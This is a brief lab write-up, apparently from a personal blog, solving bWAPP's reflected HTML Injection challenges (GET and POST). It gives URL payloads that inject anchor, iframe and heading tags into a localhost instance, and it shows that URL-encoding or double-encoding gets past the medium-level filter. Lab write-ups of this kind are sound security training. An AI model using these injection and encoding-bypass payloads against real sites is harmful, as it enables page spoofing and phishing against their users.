---
title: "BWAPP HTML Injection (GET/POST)"
date: 2019-01-18 00:00:00 +0530
categories: [Writeups]
tags: [Bwapp]
description: "BWAPP HTML Injection GET/POST solution"
permalink: /Writeups/bwapp-html/
redirect_from:
  - /bwapp-html
  - /bwapp-html/
archived: true
---


# BWAPP A1 - Injection


## HTML Injection - Reflected (GET):

### LOW LEVEL :

```
localhost/bWAPP/htmli_get.php?firstname=%3Ca+href%3D%27https%3A%2F%2Fwww.mukhilan.com%2F%27%3Etest%3C%2Fa%3E&lastname=sdf&form=submit
```

Sample payload,
```html
<a+href%3D'https://www.mukhilan.com/'+>test<%2Fa>

<iframe+src%3D"robots.txt"+height%3D"200"+width%3D"300"><%2Fiframe>
```


### MEDIUM LEVEL :

```
localhost/bWAPP/htmli_get.php?firstname=%253Ch2%253Efgh%253C%252Fh2%253E&lastname=df&form=submit 
```

In this level, Encoding will bypass the validation. 



## HTML Injection - Reflected (POST):


### LOW LEVEL :

```html 
<a href='mukhilan.com' >test</a>
```

Sample payload,
```html 
<iframe src="robots.txt"+height="200"+width="300"></iframe>
```

### MEDIUM LEVEL : 

```
%3Ch2%3Edf%3C%2Fh2%3E
```

same as GET medium level , encoding will bypass this level.


## Reference

```
https://www.owasp.org/index.php/Testing_for_HTML_Injection_(OTG-CLIENT-003)
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
```
